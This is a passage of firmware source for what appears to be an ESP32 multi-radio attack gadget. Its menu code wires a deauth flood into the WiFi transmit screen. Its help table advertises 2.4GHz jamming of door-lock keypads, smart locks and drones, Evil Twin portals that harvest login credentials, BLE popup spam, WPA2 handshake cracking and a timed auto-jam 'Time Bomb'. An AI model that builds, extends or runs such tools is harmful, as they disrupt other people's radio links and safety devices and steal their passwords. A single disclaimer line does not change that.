  else if (plan>=1000)            ggOled.printf("plan %upkt ~%lus",gNrfA.burstN,(unsigned long)((plan+500)/1000));
  else                            ggOled.printf("plan %upkt ~%lums",gNrfA.burstN,(unsigned long)plan);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("SEL=fire  hold=stream");
  ggOled.display();
}
static inline void ggScreenNrfBeacon() {
  if (!gRunInit){ gTxCount=0; gBeaconOn=false; ggNrfConfigureForTx(); if(gNrfA.repeatMs==0)gNrfA.repeatMs=500; gRunInit=true; }
  if (gEv.back){ ggStopTx(); ggBack(); return; }
  if (gEv.sel){ gBeaconOn=!gBeaconOn; gBeaconLast=millis(); }
  if (gEv.up){ int v=gNrfA.repeatMs+50; if(v>5000)v=5000; gNrfA.repeatMs=v; }
  if (gEv.down){ int v=(int)gNrfA.repeatMs-50; if(v<50)v=50; gNrfA.repeatMs=v; }
  uint32_t now=millis(), nextIn=0;
  if (gBeaconOn){ if(now-gBeaconLast>=gNrfA.repeatMs){ gBeaconLast=now; gPhase++; ggNrfSendOne(); } nextIn=gNrfA.repeatMs-(now-gBeaconLast); }
  ggNrfPollPair();
  ggOled.clearDisplay(); ggHeader("Beacon");
  ggBurstMark(14,32,(int)gPhase);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("every %ums",gNrfA.repeatMs);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(gTxCount)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); if(gBeaconOn) ggOled.printf("ON  next %lums",(unsigned long)nextIn); else ggOled.print("paused - SEL to go");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("SEL=go  UP/DN=rate");
  ggOled.display();
}
static inline void ggScreenNrfCarrier() {
  if (gEv.back){ if(gCarrierOn){ if(ggNrfToolP())ggNrfCarrierOff(ggNrfTool()); gCarrierOn=false; } ggBack(); return; }
  if (!gCarrierOn && gEv.up)   ggStepU8(gNrfA.channel,+1,GG_NRF_CH_MIN,GG_NRF_CH_MAX);
  if (!gCarrierOn && gEv.down)  ggStepU8(gNrfA.channel,-1,GG_NRF_CH_MIN,GG_NRF_CH_MAX);
  if (gEv.sel){ gCarrierOn=!gCarrierOn; if(gCarrierOn){ if(ggNrfToolP())ggNrfCarrierOn(ggNrfTool(),gNrfA);} else { if(ggNrfToolP())ggNrfCarrierOff(ggNrfTool());} }
  ggOled.clearDisplay(); ggHeader("Range check");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,16); ggOled.printf("Ch %u   Pwr %s",gNrfA.channel,GG_PWR_NAME[gNrfA.power>3?3:gNrfA.power]);
  ggOled.setTextSize(2); ggOled.setCursor(2,28); ggOled.print(gCarrierOn?"ON AIR":"OFF"); ggOled.setTextSize(1);
  ggOled.setCursor(2,46); ggOled.print("steady carrier tone");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(gCarrierOn?"SEL=stop":"SEL=start  UP/DN ch");
  ggOled.display();
}
static inline void ggScreenNrfScan() {
  if (!gRunInit){ memset(gNrfScan,0,sizeof(gNrfScan)); gScanPause=false; if(ggNrfToolP()){ggNrfTool().powerUp(); ggNrfTool().setAutoAck(false);} gRunInit=true; }
  if (gEv.back){ if(ggNrfToolP())ggNrfTool().stopListening(); ggBack(); return; }
  if (gEv.sel) gScanPause=!gScanPause;
  if (gEv.selLong){ int best=0,bv=999; for(int c=0;c<=GG_NRF_CH_MAX;c++) if(gNrfScan[c]<bv){bv=gNrfScan[c];best=c;} gNrfA.channel=best; }
  if (!gScanPause && ggNrfToolP()) ggNrfScanPass(ggNrfTool(), gNrfScan);
  int busy=0,bv=-1,clr=0,cv=999;
  for(int c=0;c<=GG_NRF_CH_MAX;c++){ if(gNrfScan[c]>bv){bv=gNrfScan[c];busy=c;} if(gNrfScan[c]<cv){cv=gNrfScan[c];clr=c;} }
  ggOled.clearDisplay(); ggHeader("Find channel");
  for(int c=0;c<=GG_NRF_CH_MAX;c++){ int h=gNrfScan[c]; if(h>24)h=24; if(h>0) ggOled.drawFastVLine(c+1,44-h,h,SSD1306_WHITE); }
  ggOled.drawFastHLine(0,44,128,SSD1306_WHITE);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setCursor(2,46); ggOled.printf("busy%d   clear%d",busy,clr);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(gScanPause?"SEL=run   hold=grab":"SEL=pause  hold=grab");
  ggOled.display();
}
static inline void ggScreenNrfRx() {
  if (!gRunInit){ gRxCount=0; gRxLen=0; if(ggNrfPresentB){ ggNrfConfigRx(ggNrfB,gNrfA); ggNrfB.setAutoAck(false); } else if(ggNrfPresentA){ ggNrfConfigRx(ggNrfA,gNrfA); ggNrfA.setAutoAck(false); } gRunInit=true; }
  if (gEv.back){ if(ggNrfPresentB)ggNrfB.stopListening(); if(ggNrfPresentA)ggNrfA.stopListening(); ggBack(); return; }
  if (gEv.sel){ gRxCount=0; gRxLen=0; }             // SELECT = reset the counter
  RF24& rx = ggNrfPresentB?ggNrfB:ggNrfA;
  if (ggNrfPresentA||ggNrfPresentB){ uint8_t l=0,pp=0; if(ggNrfRxPoll(rx,gRxLast,&l,&pp)){ gRxLen=l; gRxPipe=pp; gRxCount++; } }
  ggOled.clearDisplay(); ggHeader("Receive");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("CH%u  got %s",gNrfA.channel,ggFmtCount(gRxCount));
  ggOled.setCursor(2,27); ggOled.printf("pipe %u  len %u",gRxPipe,gRxLen);
  ggOled.setCursor(2,36); for(int i=0;i<gRxLen&&i<8;i++) ggOled.printf("%02X",gRxLast[i]);
  ggOled.setCursor(2,45); ggOled.print("\""); for(int i=0;i<gRxLen&&i<16;i++){ char c=gRxLast[i]; ggOled.write((c>=32&&c<127)?c:'.'); } ggOled.print("\"");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE); ggOled.setCursor(2,56); ggOled.print("SEL=reset  BACK=exit");
  ggOled.display();
}

// ---------------------------------------------------------------- PRESETS
static inline void ggScreenNProf() {
  if (gEv.up) ggStepU8(gSlot,-1,0,GG_PROFILE_SLOTS-1);
  if (gEv.down) ggStepU8(gSlot,+1,0,GG_PROFILE_SLOTS-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel){ gSel=0; ggGo(GS_PROFACT); return; }
  static char rows[GG_PROFILE_SLOTS][22]; const char* p[GG_PROFILE_SLOTS];
  for(int i=0;i<GG_PROFILE_SLOTS;i++){ if(ggNrfSlotUsed(i)){ GgNrfProfile t; ggNrfProfLoad(i,t); snprintf(rows[i],22,"%d %-8s CH%u",i,t.name,t.channel);} else snprintf(rows[i],22,"%d  (empty)",i); p[i]=rows[i]; }
  int top=gSlot<4?0:gSlot-3; ggMenu("Saved setups", p, GG_PROFILE_SLOTS, gSlot, top, "SEL=open  BACK");
}
static const char* const PA_USED[]={"Load this","Overwrite","Delete"}; static const char* const PA_EMPTY[]={"Save here"};
static inline void ggScreenProfAct() {
  bool used = ggNrfSlotUsed(gSlot); int n = used?3:1;
  ggMove(0, n-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel) {
    if (!used){ ggNrfProfSave(gSlot,*gNrfCfg); ggBack(); return; }
    if (gSel==0){ GgNrfProfile t; if(ggNrfProfLoad(gSlot,t)){ if(t.plLen<1||t.plLen>GG_PAYLOAD_MAX)t.plLen=8; *gNrfCfg=t; } ggBack(); return; }
    if (gSel==1){ ggNrfProfSave(gSlot,*gNrfCfg); ggBack(); return; }
    if (gSel==2){ ggNrfProfErase(gSlot); ggBack(); return; }
  }
  char t[18]; snprintf(t,sizeof(t),"Slot %u",gSlot);
  int lt=0; ggMenu(t, used?PA_USED:PA_EMPTY, n, gSel, lt, used?"":"stores current setup");
}

// ---------------------------------------------------------------- SETTINGS
enum { ST_VOL=0, ST_BEEP, ST_NMODE, ST_EDITB, ST_STATUS, ST_CNT2 };
static const char* ggSetHint(int f){ switch(f){ case ST_VOL:return "Speaker loudness 0-10";
  case ST_BEEP:return "Play a beep"; case ST_NMODE:return "How the 2 radios work";
  case ST_EDITB:return "Set radio B (dual-tx)"; case ST_STATUS:return "Radio+memory status"; } return ""; }
static inline void ggScreenSettings() {
  if (gEditing) {
    if (gSel==ST_VOL)   { if(gEv.up && gSet.volume<10)gSet.volume++; if(gEv.down && gSet.volume>0)gSet.volume--; ggSetVolume(gSet.volume); }
    if (gSel==ST_NMODE) { if(gEv.up)ggCycle(gSet.nrfMode,3,+1); if(gEv.down)ggCycle(gSet.nrfMode,3,-1); }
    if (gEv.sel || gEv.back) gEditing=false;
  } else {
    ggMove(0, ST_CNT2-1);
    if (gEv.back){ ggSaveSettings(gSet); ggBack(); return; }
    if (gEv.sel) {
      if (gSel==ST_BEEP) ggBeep(2000,120);
      else if (gSel==ST_EDITB) { ggSaveSettings(gSet); gNrfCfg=&gNrfB; ggGo(GS_NRF); return; }
      else if (gSel==ST_STATUS) { ggGo(GS_SYSTEM); return; }
      else gEditing=true;
    }
  }
  static char rows[ST_CNT2][22]; const char* p[ST_CNT2];
  snprintf(rows[ST_VOL],22,"Volume: %u", gSet.volume);
  snprintf(rows[ST_BEEP],22,"Beep >");
  snprintf(rows[ST_NMODE],22,"Radio mode: %s", GG_NM_NAME[gSet.nrfMode>2?2:gSet.nrfMode]);
  snprintf(rows[ST_EDITB],22,"Set radio B >");
  snprintf(rows[ST_STATUS],22,"System status >");
  for(int i=0;i<ST_CNT2;i++) p[i]=rows[i];
  ggMenu("Settings", p, ST_CNT2, gSel, gTop, gEditing?"UP/DN change  SEL ok":ggSetHint(gSel));
}

// ---------------------------------------------------------------- STATUS
enum { SY_A=0,SY_B,SY_C,SY_D,SY_RECHK,SY_HEAP,SY_VER,SY_CNT };
static inline void ggScreenSystem() {
  ggMove(0, SY_CNT-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel && gSel==SY_RECHK){
    ggCcPresentA = ggCcDetectOne(ggCcA, "A");
    ggCcPresentB = ggCcDetectOne(ggCcB, "B");
    ggCcPresentC = ggCcDetectOne(ggCcC, "C");
    ggCcPresentD = ggCcDetectOne(ggCcD, "D");
    ggClickOk();
  }
  static char rows[SY_CNT][24]; const char* p[SY_CNT];
  snprintf(rows[SY_A],24,"Radio A: %s", ggCcPresentA?"OK":"NOT FOUND");
  snprintf(rows[SY_B],24,"Radio B: %s", ggCcPresentB?"OK":"NOT FOUND");
  snprintf(rows[SY_C],24,"Radio C: %s", ggCcPresentC?"OK":"NOT FOUND");
  snprintf(rows[SY_D],24,"Radio D: %s", ggCcPresentD?"OK":"NOT FOUND");
  snprintf(rows[SY_RECHK],24,"Re-check radios >");
  snprintf(rows[SY_HEAP],24,"Free mem: %lu",(unsigned long)ESP.getFreeHeap());
  snprintf(rows[SY_VER],24,"%s", GG_VERSION);
  for(int i=0;i<SY_CNT;i++) p[i]=rows[i];
  ggMenu("Radio Status", p, SY_CNT, gSel, gTop, "SEL=re-check");
}

// ---------------------------------------------------------------- HELP / GUIDE
struct GgHelp { const char* title; const char* l1; const char* l2; const char* l3; const char* l4; };
// Every line is kept <=21 chars so it never clips on the 128px-wide screen.
static const GgHelp GG_HELP[] = {
  {"What is this?",  "A 2.4GHz radio that",  "SENDS data packets",   "to another nRF24.",    "Not a wifi jammer."},
  {"Send a packet",  "Transmit > SEND NOW,", "tap SELECT to fire.",  "PAIR mode + 2 radios", "lets you see it land."},
  {"Choose payload", "Transmit > Payload.",  "UP/DN sets a byte,",   "tap SEL = next byte,", "hold SEL = add byte."},
  {"Save payloads",  "Transmit>My payloads", "saves current bytes",  "to a slot. Load one",  "back to fire fast."},
  {"Send saved",     "My payloads: pick",    "one, Load & send",     "fires it now. Set",    "amount on Transmit."},
  {"Two radios",     "Settings>Radio mode:", "PAIR: A tx, B hears.", "DUAL: A+B both send.", "HOTSWAP: use one."},
  {"Channel+Speed",  "Channel 0-125 is the", "frequency. Speed is",  "the data rate. Both",  "radios must match."},
  {"Address",        "A 5-byte name both",   "radios share. The",    "receiver needs the",   "same address, too."},
  {"Beacon",         "Sends one packet",     "over and over on a",   "timer. Good for",      "soak-running an RX."},
  {"Range check",     "A steady tone on one", "channel. Walk away",   "to see how far it",    "reaches. OFF after."},
  {"Find channel",   "Listens on every",     "channel, shows the",   "busy ones. Hold SEL",  "to grab a clear one."},
  {"Burst",          "Advanced > Burst",     "count = packets per",  "SEND. Gap = ms",       "between each one."},
  {"Not sending?",   "Status must show",     "both radios OK. If",   "NOT FOUND, check",     "wiring and power."},
  {"Cop/Surv scan",  "WiFi-only scan for",   "surveillance SSIDs:",  "Flock, Axon, ALPR,",   "Genetec, Verkada..."},
  {"Tracker scan",   "BLE-only scan for",    "trackers: AirTag,",    "Tile, SmartTag,",      "Chipolo, Garmin..."},
  {"WiFi TX",        "Beacon flood on a",    "WiFi ch. Pick network","to auto-set. Rate in", "PPS, power, payload."},
  {"WiFi Flood",     "Pick a network then",  "flood all clients.",   "Check Faraday cage",   "shielding for leaks."},
  {"BLE TX",         "BLE ads on all or",    "single ch 37/38/39.",  "Set PPS rate, power,", "payload. Scan nearby."},
  {"Full Jam",       "All 3 radios blast",   "the entire 2.4GHz",    "band at once. WiFi+",  "BLE+nRF max power."},
  {"Keypad buster",  "Jams wireless 2.4G",   "keypads (door locks,", "garage openers) by",   "flooding their ch."},
  {"Radius jammer",  "Scans ALL nearby",     "networks, then jams",  "every channel found.", "WiFi+BLE+nRF."},
  {"Beacon spam",    "Floods fake WiFi",     "SSIDs with NAV. All",  "phones see phantom",   "networks appear."},
  {"BLE spam",       "Fake Apple device",    "popups on iPhones.",   "Proximity Pairing",    "broadcast flood."},
  {"Evil Twin",      "Clones a WiFi AP",     "as open network.",     "Captive portal traps", "login credentials."},
  {"Drone Jammer",   "All radios flood",     "2.4GHz. Cheap drones", "lose link & drop.",    "GPS drones hover."},
  {"Probe Harvest",  "Passive sniff of",     "probe requests.",      "Shows what WiFi",      "devices search for."},
  {"WiFi Rickroll",  "Broadcast a custom",   "message as a WiFi",    "network name. All",    "nearby phones see."},
  {"Speaker Jam",    "Disrupts Bluetooth",   "speakers via nRF+",    "BLE+WiFi flood on",    "the BT Classic band."},
  {"Smart Lock",     "BLE disruption for",   "smart locks. Targets", "BLE data channels",    "with nRF+BLE noise."},
  {"Network Audit",  "Scans WiFi nets and",  "shows encryption:",    "OPEN/WEP/WPA/WPA2/",  "WPA3 + security."},
  {"Saved Creds",    "View credentials",     "caught by Evil Twin.", "User:pass list.",      "SEL on [CLEAR ALL]."},
  {"Auth Flood",     "Floods target AP",     "with 802.11 auth",     "request frames.",      "Exhausts AP table."},
  {"WiFi Fuzzer",    "Random frame types",   "and lengths on any",   "channel. Protocol",    "stress test tool."},
  {"Quiet Storm",    "802.11h Quiet IE",     "in beacon frames.",     "Tells clients to",     "stop transmitting."},
  {"BSSID Clone",    "Spoofs exact BSSID",   "and SSID of a real",    "AP. Confuses WiFi",    "clients on channel."},
  {"Fake AP Farm",   "Broadcasts 12 fake",   "SSIDs at once.",        "Junk networks flood",  "WiFi scanner lists."},
  {"Time Bomb",      "Arms a countdown,",    "then auto-starts",     "Full Jam when the",    "timer hits zero."},
  {"Deauth Detect",  "Passive monitor for",  "deauth/disassoc.",      "Hops WiFi channels",   "to find attackers."},
  {"Geofence",       "Scans for a target",   "SSID periodically.",    "Alerts when the",      "network appears."},
  {"MAC Harvest",    "Collects unique BLE",  "MAC addresses from",    "nearby devices. Shows","RSSI and count."},
  {"Prox Alert",     "Beeps when any BLE",   "device signal is",      "above threshold.",     "Close range warning."},
  {"UUID Scanner",   "Scans BLE devices",    "and shows service",     "UUIDs. Identifies",    "device types."},
  {"BLE Range",      "Signal strength",      "meter for nearest",     "BLE device. Bar",      "graph display."},
  {"Progressive Jam","Starts low power,",    "ramps up over time.",   "WiFi+BLE+nRF all",     "increase together."},
  {"Chain Attack",   "Cycles WiFi>BLE>nRF",  "phases 10s each.",      "Different radio",      "active each phase."},
  {"Auto-Target",    "Scans and picks the",  "strongest WiFi AP,",    "then hits it with",    "all 3 radios."},
  {"WiFi Heatmap",   "Bar chart of APs",     "per WiFi channel.",     "Shows congestion",     "across 1-14."},
  {"Band Occupancy", "nRF spectrum sweep",   "across 0-125 ch.",      "Shows real-time RF",   "energy levels."},
  {"Packet Rate",    "Counts WiFi packets",  "per second in",         "promiscuous mode.",    "Live traffic meter."},
  {"Attack Timer",   "Countdown to auto-",   "start an attack type.", "Choose: Full Jam,",    "Beacon, or BLE."},
  {"FastPair Spam",  "Google Fast Pair",     "popups on Android.",    "Fake earbuds/phones",  "pair requests."},
  {"Samsung Spam",   "Samsung Buds fake",    "popups on Galaxy.",     "Spoofs Buds Pro,",     "Buds Live, etc."},
  {"SwiftPair Spam", "Microsoft Swift",      "Pair popups. Fake",     "keyboards, mice,",     "headsets appear."},
  {"Name Spam",      "Random IoT device",    "names broadcast.",      "TV, Cam, Lock,",       "Thermostat, etc."},
  {"Coffee Portal",  "Evil Twin themed",     "as coffee shop.",       "'Free WiFi' login",    "page for testing."},
  {"Hotel Portal",   "Evil Twin themed",     "as hotel guest net.",   "Room number +",        "last name login."},
  {"Update Portal",  "Evil Twin themed",     "as router firmware.",   "'Re-enter WiFi",       "password' prompt."},
  {"WiFi Crack",     "Captures WPA2 4-way",  "EAPOL handshake via",  "nRF jam. Dictionary",  "attack on-device."},
  {"Blackout",       "ALL radios on ALL",    "channels at once.",    "WiFi 1-14 + BLE +",   "nRF 0-125 full band."},
  {"Legal",          "Only transmit on",     "bands you may use.",   "Don't jam or block",   "others. Be safe."},
};
#define GG_HELP_N (int)(sizeof(GG_HELP)/sizeof(GG_HELP[0]))
static inline void ggScreenHelp() {
  if (gEv.up) ggStepU8(gHelpSel,-1,0,GG_HELP_N-1);
  if (gEv.down) ggStepU8(gHelpSel,+1,0,GG_HELP_N-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel){ ggGo(GS_HELPPAGE); return; }
  static char rows[GG_HELP_N][22]; const char* p[GG_HELP_N];
  for(int i=0;i<GG_HELP_N;i++){ snprintf(rows[i],22,"%s",GG_HELP[i].title); p[i]=rows[i]; }
  int top=gHelpSel<4?0:gHelpSel-3;
  ggMenu("Help & Guide", p, GG_HELP_N, gHelpSel, top, "SEL=read  BACK");
}
static inline void ggScreenHelpPage() {
  if (gEv.back){ ggBack(); return; }
  if (gEv.down && gHelpSel<GG_HELP_N-1) gHelpSel++;
  if (gEv.up   && gHelpSel>0) gHelpSel--;
  const GgHelp& h = GG_HELP[gHelpSel];
  ggOled.clearDisplay(); ggHeader(h.title);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  // 4 body lines on a 9px grid (y16..y43) so nothing lands on the y54 footer
  ggOled.setCursor(2,16); ggOled.print(h.l1);
  ggOled.setCursor(2,25); ggOled.print(h.l2);
  ggOled.setCursor(2,34); ggOled.print(h.l3);
  ggOled.setCursor(2,43); ggOled.print(h.l4);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE); ggOled.setCursor(2,56);
  ggOled.printf("%d/%d  UP/DN  BACK", gHelpSel+1, GG_HELP_N);
  ggOled.display();
}

// ---------------------------------------------------------------- SCANS (cop + tracker)
//  NON-BLOCKING: WiFi runs an async scan and BLE runs a background scan with a
//  per-advert callback, so this screen redraws every loop and BACK/SELECT stay
//  instant. It LISTENS only - the nRF24s are idle and nothing is transmitted.
// ---------------------------------------------------------------- COP / SURVEILLANCE SCAN (WiFi only)
static inline void ggScreenCopScan() {
  if (!gRunInit) { ggCopScanBegin(); gRunInit=true; }
  if (gEv.back) { ggCopScanEnd(); ggBack(); return; }
  if (gEv.sel)  { ggCopWifiSeen=0; ggCopWifiHit=0; ggCopBleSeen=0; ggCopBleHit=0; ggCopLast[0]=0; }
  ggCopScanPoll();
  bool hit = ggCopNewHit; ggCopNewHit=false;
  uint32_t totalHit = ggCopWifiHit + ggCopBleHit;

  ggOled.clearDisplay(); ggHeader("Cop/Surv scan");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("W:%lu B:%lu scanned",(unsigned long)ggCopWifiSeen,(unsigned long)ggCopBleSeen);
  ggOled.setCursor(2,28);
  if (totalHit > 0) {
    ggOled.setTextSize(2); ggOled.printf("%lu HIT!",(unsigned long)totalHit); ggOled.setTextSize(1);
  } else {
    ggOled.setTextSize(2); ggOled.print("0 clear"); ggOled.setTextSize(1);
  }
  ggOled.setCursor(2,45);
  if (ggCopLast[0]) ggOled.print(ggCopLast);
  else ggOled.print("Flock/Axon/Verkada..");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE); ggOled.setCursor(2,56);
  ggOled.print("scanning  SEL=reset");
  ggOled.display();
  if (hit) { ggBeep(2300,60); ggBeep(2700,90); }
}

// ---------------------------------------------------------------- TRACKER SCAN (BLE only)
static inline void ggScreenTrackerScan() {
  if (!gRunInit) { ggTrkScanBegin(); gRunInit=true; }
  if (gEv.back) { ggTrkScanEnd(); ggBack(); return; }
  if (gEv.sel)  { ggTrkBleSeen=0; ggTrkTrackCnt=0; ggTrkLast[0]=0; }

  bool hit = ggTrkNewHit; ggTrkNewHit=false;

  ggOled.clearDisplay(); ggHeader("Tracker scan");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("BLE seen: %lu",(unsigned long)ggTrkBleSeen);
  ggOled.setCursor(2,28);
  if (ggTrkTrackCnt > 0) {
    ggOled.setTextSize(2); ggOled.printf("%lu found",(unsigned long)ggTrkTrackCnt); ggOled.setTextSize(1);
  } else {
    ggOled.setTextSize(2); ggOled.print("0 clear"); ggOled.setTextSize(1);
  }
  ggOled.setCursor(2,45);
  if (ggTrkLast[0]) ggOled.print(ggTrkLast);
  else ggOled.print("AirTag/Tile/SmartTag");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE); ggOled.setCursor(2,56);
  ggOled.print("scanning  SEL=reset");
  ggOled.display();
  if (hit) { ggBeep(2300,60); ggBeep(2700,90); }
}

// ---------------------------------------------------------------- WIFI TX config
enum { W_SEND=0, W_CH, W_PWR, W_PPS, W_FRAME, W_DUR, W_DATA, W_PICK, W_FLOOD, W_SAVE, W_LOAD, W_CNT };
static const char* ggWifiHint(int f) {
  switch (f) { case W_SEND:return "Fire beacons now"; case W_CH:return "WiFi ch 1-14";
    case W_PWR:return "TX strength"; case W_PPS:return "Packets per second";
    case W_FRAME:return "Bigger=more airtime"; case W_DUR:return "0=keep going";
    case W_DATA:return "Data in beacon SSID"; case W_PICK:return "Scan & auto-set ch";
    case W_FLOOD:return "Deauth flood now!"; case W_SAVE:return "Store to flash now"; case W_LOAD:return "Restore from flash"; } return "";
}
static inline void ggWifiLabel(int f, char* o, size_t n) {
  switch (f) {
    case W_SEND:  snprintf(o,n,"SEND NOW >"); break;
    case W_CH:    snprintf(o,n,"Channel: %u", gWifiTx.channel); break;
    case W_PWR:   snprintf(o,n,"Power: %s", GG_WP_NAME[gWifiTx.power>3?3:gWifiTx.power]); break;
    case W_PPS:   snprintf(o,n,"Rate: %u pps", gWifiTx.pps); break;
    case W_FRAME: snprintf(o,n,"Frame: %s", GG_WF_NAME[gWifiTx.frameSize>1?1:gWifiTx.frameSize]); break;
    case W_DUR:   if (gWifiTx.durationSec==0) snprintf(o,n,"Duration: CONT");
                  else snprintf(o,n,"Duration: %us", gWifiTx.durationSec); break;
    case W_DATA:  snprintf(o,n,"Payload: %02X%02X.. >",gWifiTx.payload[0],gWifiTx.payloadLen>1?gWifiTx.payload[1]:0); break;
    case W_PICK:  snprintf(o,n,"Pick network >"); break;
    case W_FLOOD: snprintf(o,n,"Deauth flood >"); break;
    case W_SAVE:  snprintf(o,n,"Save config"); break;
    case W_LOAD:  snprintf(o,n,"Load config"); break;
  }
}
static inline void ggWifiAdjust(int f, int dir) {
  switch (f) {
    case W_CH:    { int v=(int)gWifiTx.channel+dir; if(v<1)v=14; if(v>14)v=1; gWifiTx.channel=(uint8_t)v; break; }
    case W_PWR:   ggCycle(gWifiTx.power,4,dir); break;
    case W_PPS:   ggStepU16(gWifiTx.pps,dir,10,10,1000); break;
    case W_FRAME: ggCycle(gWifiTx.frameSize,2,dir); break;
    case W_DUR:   { int v=(int)gWifiTx.durationSec+dir*10; if(v<0)v=0; if(v>300)v=300; gWifiTx.durationSec=(uint16_t)v; break; }
  }
}
static inline void ggScreenWifiTx() {
  if (gEditing) {
    if (gEv.up) ggWifiAdjust(gSel,+1); if (gEv.down) ggWifiAdjust(gSel,-1);
    if (gEv.sel||gEv.back) gEditing=false;
  } else {
    ggMove(0, W_CNT-1);
    if (gEv.back){ ggBack(); return; }
    if (gEv.sel) {
      switch (gSel) {
        case W_SEND: ggGo(GS_WIFI_TX_RUN); return;
        case W_DATA: ggOpenBytes(gWifiTx.payload, gWifiTx.payloadLen, "WIFI DATA", false, &gWifiTx.payloadLen, 32); return;
        case W_PICK: ggGo(GS_WIFI_PICK); return;
        case W_FLOOD: gWifiFloodMode=true; ggGo(GS_WIFI_PICK); return;
        case W_SAVE: ggSaveWifiTx(gWifiTx); ggChirpUp(); break;
        case W_LOAD: if (ggLoadWifiTx(gWifiTx)) ggChirpDown(); break;
        default: gEditing=true; break;
      }
    }
  }
  static char rows[W_CNT][22]; const char* p[W_CNT];
  for (int i=0;i<W_CNT;i++){ ggWifiLabel(i,rows[i],sizeof(rows[i])); p[i]=rows[i]; }
  ggMenu("WiFi TX", p, W_CNT, gSel, gTop, gEditing?"UP/DN change  SEL ok":ggWifiHint(gSel));
}

// ---------------------------------------------------------------- WIFI TX run
static inline void ggScreenWifiTxRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiTxBegin(gWifiTx);
    if (ggWifiDeauthMode) ggFloodNrfStart(gWifiTx.channel);
    gWifiTxStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggFloodNrfStop(); ggWifiTxEnd(); ggBack(); return; }
  if (gWifiTx.durationSec > 0) {
    uint32_t el = (millis()-gWifiTxStartMs)/1000;
    if (el >= gWifiTx.durationSec) { ggFloodNrfStop(); ggWifiTxEnd(); ggBack(); return; }
  }
  if (gEv.up)   { int v=(int)gWifiTx.channel+1; if(v>14)v=1;  gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); if(ggFloodNrfActive){ggFloodNrfStop();ggFloodNrfStart(gWifiTx.channel);} }
  if (gEv.down) { int v=(int)gWifiTx.channel-1; if(v<1)v=14; gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); if(ggFloodNrfActive){ggFloodNrfStop();ggFloodNrfStart(gWifiTx.channel);} }
  ggFloodNrfPump();
  uint32_t cnt = ggWifiPktCnt;
  uint32_t elapsed = (millis()-gWifiTxStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/100;
  bool flood = ggWifiDeauthMode;
  ggOled.clearDisplay(); ggHeader(flood ? "RF FLOOD" : "WiFi TX");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  if (flood) {
    ggOled.setCursor(34,18); ggOled.printf("CH%u QUAD+NAV", gWifiTx.channel);
  } else {
    ggOled.setCursor(34,18); ggOled.printf("CH%u %s %s", gWifiTx.channel, GG_WP_NAME[gWifiTx.power>3?3:gWifiTx.power], GG_WF_NAME[gWifiTx.frameSize>1?1:gWifiTx.frameSize]);
  }
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45);
  if (flood && ggFloodNrfActive) {
    ggOled.printf("%lu/s nRF ch%u-%u",(unsigned long)pps,ggFloodNrfChLo,ggFloodNrfChHi);
  }
  else if (ggWifiTxErr > 0) ggOled.printf("%lu/s err:0x%lX",(unsigned long)pps,(unsigned long)ggWifiLastErr);
  else if (gWifiTx.durationSec>0) { uint32_t left=gWifiTx.durationSec>elapsed?gWifiTx.durationSec-elapsed:0; ggOled.printf("%lu/s %lus left",(unsigned long)pps,(unsigned long)left); }
  else ggOled.printf("%lu/s  on air %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  UP/DN ch");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI pick network
static inline void ggScreenWifiPick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { gWifiFloodMode=false; ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Pick network");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Pick network");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
